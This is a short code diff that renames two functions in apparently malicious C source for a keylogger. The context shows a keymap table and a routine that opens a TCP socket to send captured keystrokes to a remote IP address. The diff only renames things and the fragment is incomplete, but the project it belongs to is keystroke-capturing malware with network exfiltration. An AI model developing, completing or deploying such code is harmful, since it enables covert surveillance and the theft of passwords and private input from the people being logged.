@@ -73,7 +73,7 @@ static const char *keymap[256] = {[1] = "[ESC]",      [2] = "1",
                                   [125] = "[LMETA]",  [126] = "[RMETA]",
                                   [127] = "[COMPOSE]"};
 
-int process_key_event(void *ctx, void *data, size_t data_sz) {
+int keylogger_processor_process_event(void *ctx, void *data, size_t data_sz) {
     (void)data_sz;
     ssize_t ret;
     keylogger_context_t *keylogger_ctx = (keylogger_context_t *)ctx;
@@ -99,7 +99,7 @@ int process_key_event(void *ctx, void *data, size_t data_sz) {
     return 0;
 }
 
-int init_keylogger_sender_socket(const char *ip, int port) {
+int keylogger_processor_init_sender_socket(const char *ip, int port) {
     int ret = 0;
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0)
